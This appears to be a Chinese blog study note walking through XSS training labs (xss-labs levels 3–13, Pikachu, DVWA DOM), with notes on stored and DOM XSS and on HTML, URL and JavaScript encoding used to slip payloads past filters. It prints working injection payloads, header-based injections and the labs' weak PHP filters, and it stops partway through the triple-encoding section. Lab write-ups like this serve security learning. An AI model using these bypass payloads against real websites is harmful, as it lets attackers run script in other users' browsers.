<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level3<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和<span class="symbol">&amp;quot;</span><span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>svg onload=alert(/xss/)<span class="symbol">&amp;gt;</span>相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">level3.php</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&#x27;<span class="symbol">&amp;quot;</span><span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>svg onload=alert(/xss/)<span class="symbol">&amp;gt;</span>&#x27;</span>&gt;</span>	</span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">搜索</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level3.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>payload的长度:27<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>onmouseout 事件：发生在 鼠标指针移出指定的对象时发生</p>
<p>onmouseover 事件：发生 在鼠标指针移动到元素或它的子元素上</p>
<ul>
<li>输入<code>&#39; onmouseover=javascript:alert(/xss/) &#39;</code> 后，点击搜索按钮，将鼠标重新移动到输入框则会显示</li>
<li>若输入的是<code>&#39; onmouseout=javascript:alert(/xsss/) &#39;</code>，鼠标离开输入框会显示</li>
<li>第四关 做法同 第三关</li>
</ul>
<h2 id="level-5-7"><a href="#level-5-7" class="headerlink" title="level-5~7"></a>level-5~7</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">    <span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line">    <span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line">    <span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line">    <span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.</span><br><span class="line"><span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">	&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">		&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">		&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">	&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>5：源码中给 o 与 n 之间加了 下划线，导致无法执行（script也不行），但可用 a标签进行绕过</li>
<li>6：a标签 也被过滤了，但可以用大写，在 <strong>下划线的位置处</strong> 将字母大写（<strong>大小写绕过</strong>）</li>
<li>7：将标签中的属性名替换为了 空，如href、script、onerror等，我们可以双写进行绕过。注意不能单纯地直接在后面双写，而是要加在中间使 其被替换后，剩下的字符串依旧能组成适合的属性（<strong>双写绕过</strong>）</li>
</ul>
<h2 id="level-10-13"><a href="#level-10-13" class="headerlink" title="level-10~13"></a>level-10~13</h2><p><strong>LV-10</strong></p>
<p>没有之前的输入框，但可以根据 keyword 的值进行类似的操作，查看源码后，发现输入框 <code>input</code> 被隐藏了， 三个 <code>input</code> 之中说不定有输入框，修改 其 属性值，让他们显现。也就是在三个input中输入 XSS 语句</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/100/xss-01.jpg"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level10<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">search</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_link&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_history&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level10.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>payload的长度:0<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>一 一尝试后发现 只有名为 <code>t_sort</code> 的标签输入内容可以相应，其余两个仅仅只是个框。</p>
<ul>
<li>可以用 F12 修改 <code>input</code> 的 type 属性（删去 hidden 即可，但太麻烦，刷新一下就被 重置了）</li>
</ul>
<blockquote>
<p>?keyword&#x3D;1&amp;t_history&#x3D;” type&#x3D;”text”&amp;t_link&#x3D;” type&#x3D;”text”&amp;t_sort&#x3D;” type&#x3D;”text”&gt;<br>    也可在 网址框 中输入如上;名字的值的 引号 是为了闭合value的 前引号<br>    keyword 的值无所谓</p>
</blockquote>
</li>
<li><p>之后在后面输入 XSS语句，但这里 过滤了 <code>&lt; &gt; </code> ，我们可以使用 onclick 事件，onmouseover 事件也可</p>
<ul>
<li>onclick 事件：单击按钮时执行 JavaScript</li>
</ul>
</li>
<li><p>最后构造的语句为 <code>?keyword=1&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(/xss/)&quot;</code></p>
</li>
</ul>
<p><strong>LV-11</strong></p>
<p>​	查看源码，与上一关类型相同，这次有四个 <code>input</code> 隐藏标签，第四个 <code>t_ref</code> 是HTTP头的Referer参数。 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form id=search&gt;</span><br><span class="line">    &lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;t_ref&quot;  value=&quot;http://xss/level10.php?				keyword=1&amp;t_sort=%22%20type=%22text%22%20onclick=%22alert(/xxx/)%22&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>试一下 上一关 的思路，发现无法进行GET传参，POST也不行</p>
</li>
<li><p>再试试 Referer，BP抓包，在报文中添加 Referer参数，形式如上一关相同</p>
</li>
</ul>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/100/xss-02.jpg"></p>
<ul>
<li>查看源码，可以看出确实是HTTP中的 Referer 参数</li>
</ul>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/100/xss-03.jpg"></p>
<p><strong>LV-12</strong></p>
<p>​	此关是 <code>t_ua</code> 为报文中的 <code>User-Agent</code> 参数，做法同上一关</p>
<p><strong>LV-13</strong></p>
<p>​	此关 <code>t_cook</code> 是 报文中的 <code>cookie</code> 参数，浏览器就可修改，Edge 为【应用程序】中的【存储】，与上一关一样，修改 user 的值即可</p>
<h2 id="JS-输出-pikachu"><a href="#JS-输出-pikachu" class="headerlink" title="JS 输出(pikachu)"></a>JS 输出(pikachu)</h2><p>​	随便输入 111，查看源码查找输入的值，发现此代码会将我们输入的值用 JS 判断，然后输出</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/100/xss-04.jpg"></p>
<ul>
<li>可以构造语句，闭合 <code>script</code> 标签： <code>&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></li>
</ul>
<p>​	反射型的 XSS 大多是构造 包含闭合标签的语句，如 iput、script这些标签，或者 keyword、name 这些标签中的属性，闭合之后加上造成XSS的语句，自然就能触发XSS漏洞</p>
<h1 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h1><p>​	持久型XSS，攻击脚本 将 永远存放于目标服务器的 数据库 或 文件 中，隐蔽性高</p>
<p>​	攻击方式：攻击者在发帖时，将 恶意脚本连同正常信息一起注入帖子内容中，帖子被服务器存储下来后，恶意脚本也永久地存于服务器的存储器中，其他用户浏览时，恶意脚本将会在浏览器中执行。常见于论坛、博客和留言板</p>
<h1 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h1><p>​	使用 DOM 可以使 程序 和 脚本 能够动态访问和更新文档内容、结构及样式。</p>
<p>​	HTML 的标签都是节点，这些节点组成了 DOM 的整体结构(节点树)。通过 HTML DOM 树中的所有标签(节点)均可通过 JS进行访问，所有 标签(节点)均可被修改，也可以 创建 或 删除 节点。</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/100/xss-07.jpg"></p>
<p>​	攻击方式：用户 请求一个 经过专门设计的URL，它由 攻击者 提交，而且其中包含 XSS代码，服务器的响应不会以任何形式包含 攻击者 的脚本。</p>
<p><strong>DOM_medium：</strong></p>
<p>​	只有若干个选项可供选择，选择的内容会体现在URL上</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/100/xss-05.jpg" alt="xss-05"></p>
<p>​	F12查看源码后，发现这些选项标签(option)在一个 select 标签下，所以可以将这两个标签闭合，再加上xss语句，就能造成xss</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/100/xss-06.jpg"></p>
<p>​		构造的XSS语句为 <code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;body onload=alert(/xss/)&gt;</code> ，啊不过 script标签 不可用，因为源码禁止使用(但也只禁止了script)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !<span class="title function_ invoke__">is_null</span> (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    <span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span> (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h1><p><strong>浏览器的解码顺序</strong></p>
<p>​	HTML解析—&gt;URL解析—&gt;JavaScript解析(只支持Unicode)</p>
<p>​	正因为解码有先后顺序，所以为了不影响页面的正常加载，我们加密的时候需要按照顺序进行，先进行JS加密，然后再进行URL加密，最后进行HTML加密，即：JavaScript编码—&gt;URL编码—&gt;HTML编码</p>
<ul>
<li><p>HTML编码：<code>&amp;</code>开头<code>;</code>结尾，中间字符有：</p>
<ul>
<li><p>英文字符（比如 空格： <code>&amp;nbsp;</code>，这些又叫 实体表示法）</p>
</li>
<li><p>#+十进制数 || #x+十六进制数（r：<code>&amp;#x72;</code>，t：<code>&amp;#x74;</code>）</p>
</li>
</ul>
<table>
<thead>
<tr>
<th></th>
<th>实体名称</th>
<th>实体编号(十进制)</th>
<th>实体编号(十六进制)</th>
</tr>
</thead>
<tbody><tr>
<td>空格</td>
<td><code>&amp;nbsp;</code></td>
<td><code>&amp;#160;</code></td>
<td><code>&amp;#x20;</code></td>
</tr>
<tr>
<td>&lt;</td>
<td><code>&amp;lt;</code></td>
<td><code>&amp;#60;</code></td>
<td><code> &amp;#x3c;</code></td>
</tr>
<tr>
<td>&gt;</td>
<td><code> &amp;gt;</code></td>
<td><code>&amp;#62;</code></td>
<td><code>&amp;#x3e;</code></td>
</tr>
<tr>
<td>&amp;</td>
<td><code> &amp;amp;</code></td>
<td><code>&amp;#38;</code></td>
<td><code>&amp;#x26;</code></td>
</tr>
<tr>
<td>“</td>
<td><code>&amp;quot;</code></td>
<td><code>&amp;#34;</code></td>
<td><code>&amp;#x22;</code></td>
</tr>
<tr>
<td>‘</td>
<td><code>&amp;apos;</code></td>
<td><code>&amp;#39;</code></td>
<td><code>&amp;#x27;</code></td>
</tr>
</tbody></table>
</li>
<li><p>URL编码：百分号% + 该字符的ASCII码所对应的十六进制数（比如 空格:%20）</p>
</li>
<li><p>JS编码(只支持Unicode)：\u + 四个十六进制数，如果个数不够，前面补0（&lt; ：\u003c）</p>
</li>
</ul>
<h2 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h2><blockquote>
<p>不能编码：标签、标签中的属性、标签前后的&lt; &gt;</p>
<p>可以对标签中属性的值进行编码(包括伪协议类型和js代码)</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1号：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>未编码<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">2号：<span class="tag">&lt;<span class="name">a</span> <span class="attr">hre</span>&amp;#<span class="attr">x66</span>;=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>编码href中的f<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">3号：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;java<span class="symbol">&amp;#x73;</span>cript:alert(/xss/)&quot;</span>&gt;</span>编码javascript的s<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">4号：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:<span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6C;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x74;</span>(/xss/)&quot;</span>&gt;</span>alert整个编码<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">5号：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert<span class="symbol">&amp;#x28;</span>/xss/<span class="symbol">&amp;#x29;</span>&quot;</span>&gt;</span>编码 ( )<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/100/xss-08.jpg"></p>
<table>
<thead>
<tr>
<th></th>
<th>编码状况</th>
<th>是否绕过</th>
</tr>
</thead>
<tbody><tr>
<td>1号</td>
<td>未编码</td>
<td></td>
</tr>
<tr>
<td>2号</td>
<td>标签中的属性</td>
<td>否</td>
</tr>
<tr>
<td>3号</td>
<td>属性值：s</td>
<td>是</td>
</tr>
<tr>
<td>4号</td>
<td>属性值：alert</td>
<td>是</td>
</tr>
<tr>
<td>5号</td>
<td>属性值：( )</td>
<td>是</td>
</tr>
</tbody></table>
<p>​	2号失败原因：HTML编码破坏了 a标签 中的href属性，导致 a标签 DOM树构建失败而解析无效，HTML解析器识别不了，致使解析成为一个文本格式</p>
<h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><blockquote>
<p>不能编码：标签、标签中的属性、标签前后的&lt; &gt;</p>
<p>不能对伪协议类型进行编码(如：JavaScript）</p>
<p>可以编码：伪协议类型后跟的 JS代码，如：alert(&#x2F;xss&#x2F;) </p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1号：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>未编码<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">2号：<span class="tag">&lt;<span class="name">a</span> <span class="attr">hre</span>%<span class="attr">66</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>编码href中的f<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">3号：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;java%73cript:alert(/xss/)&quot;</span>&gt;</span>编码javascript的s<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">4号：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:%61%6C%65%72%74(/xss/)&quot;</span>&gt;</span>alert整个编码<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">5号：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert%28/xss/%29&quot;</span>&gt;</span>编码 ( )<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/100/xss-09.jpg" alt="xss-09"></p>
<table>
<thead>
<tr>
<th></th>
<th>编码状况</th>
<th>是否绕过</th>
</tr>
</thead>
<tbody><tr>
<td>1号</td>
<td>未编码</td>
<td></td>
</tr>
<tr>
<td>2号</td>
<td>标签中的属性</td>
<td>否</td>
</tr>
<tr>
<td>3号</td>
<td>属性值：s</td>
<td>否，破坏了伪协议类型，alert无法生效</td>
</tr>
<tr>
<td>4号</td>
<td>属性值：alert</td>
<td>是</td>
</tr>
<tr>
<td>5号</td>
<td>属性值：(  )</td>
<td>是</td>
</tr>
</tbody></table>
<p>​	2号失败原因：按照解码顺序先进行HTML解码，然后是URL解码，URL编码破坏了a标签 中的href属性，导致 a标签 DOM树解析失败构建无效，HTML解析器识别不了，致使解析成为一个文本格式</p>
<h2 id="JS编码"><a href="#JS编码" class="headerlink" title="JS编码"></a>JS编码</h2><blockquote>
<p>不能编码：标签、标签中的属性、标签前后的&lt; &gt;</p>
<p>不能对伪协议类型进行编码，如：JavaScript</p>
<p>不能对伪协议类型后的 JS代码 中的控制字符进行编码，如：alert(&#x2F;xss&#x2F;)中的括号 ()</p>
<p>可以对伪协议类型后跟的 JS代码 进行编码(不包括控制字符)，如：alert（括号 不能编码）</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1号：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>未编码<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">2号：<span class="tag">&lt;<span class="name">a</span> <span class="attr">hre</span>\<span class="attr">u0066</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>编码href中的f<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">3号：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;java\u0073cript:alert(/xss/)&quot;</span>&gt;</span>编码javascript的s<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">4号：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:\u0061\u006C\u0065\u0072\u0074(/xss/)&quot;</span>&gt;</span>alert整个编码<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">5号：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert\u0028/xss/\u0029&quot;</span>&gt;</span>编码 ( )<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th></th>
<th>编码状况</th>
<th>是否绕过</th>
</tr>
</thead>
<tbody><tr>
<td>1号</td>
<td>未编码</td>
<td></td>
</tr>
<tr>
<td>2号</td>
<td>标签中的属性</td>
<td>否</td>
</tr>
<tr>
<td>3号</td>
<td>属性值：s</td>
<td>否，JS编码破坏了伪协议类型，alert无法生效</td>
</tr>
<tr>
<td>4号</td>
<td>属性值：alert</td>
<td>是</td>
</tr>
<tr>
<td>5号</td>
<td>属性值：(  )</td>
<td>否，JS不能对 <code>控制字符()</code> 进行编码</td>
</tr>
</tbody></table>
<h2 id="二次混淆编码"><a href="#二次混淆编码" class="headerlink" title="二次混淆编码"></a>二次混淆编码</h2><blockquote>
<p>JS 不能编码：伪协议类型后的 JS代码 中的控制字符，如 alert(&#x2F;xss&#x2F;)中的括号 ()</p>
<p>JS、URL 都不能编码：伪协议类型，如 JavaScript</p>
<p>三者都不能编码：标签、标签中的属性、标签前后的&lt; &gt;</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1号：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:%5Cu0061%5Cu006c%5Cu0065%5Cu0072%5Cu0074(/xss/)&quot;</span>&gt;</span>alert整个先进行JS编码,再URL编码<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">2号：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:<span class="symbol">&amp;#x5c;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x5c;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x5c;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x5c;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x32;</span><span class="symbol">&amp;#x5c;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x34;</span>(/xss/)&quot;</span>&gt;</span>alert整个先进行JS编码,再HTML编码<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">3号：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:<span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x43;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x32;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x34;</span>(/xss/)&quot;</span>&gt;</span>alert整个先进行URL编码,再HTML编码<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/100/xss-10.jpg" alt="xss-10"></p>
<table>
<thead>
<tr>
<th></th>
<th>编码顺序</th>
<th>是否绕过</th>
</tr>
</thead>
<tbody><tr>
<td>1号</td>
<td>JS，URL</td>
<td>是</td>
</tr>
<tr>
<td>2号</td>
<td>JS，HTML</td>
<td>是</td>
</tr>
<tr>
<td>3号</td>
<td>URL，HTML</td>
<td>是</td>
</tr>
</tbody></table>
<p>​	只要按照浏览器解码的顺序逆着来编码，基本上都能绕过</p>
<p>​	<del>说起这个编码啊，一些网站都不转码字母(比如URL编码)，但反观其编码方式发现它们是由固定的格式和十六进制数组成，所以可以将要编码的字符串转换成十六进制加上前缀即可</del></p>
<h2 id="三次混淆编码"><a href="#三次混淆编码" class="headerlink" title="三次混淆编码"></a>三次混淆编码</h2><p>步骤：</p>
<ul>
<li><p>JS编码：对alert进行编码，不能对控制字符( )进行编码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:\u0061\u006C\u0065\u0072\u0074(/xss/)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>URL编码：对经过 JS编码后的字符 和 (&#x2F;xss&#x2F;) 进行URL编码</p>
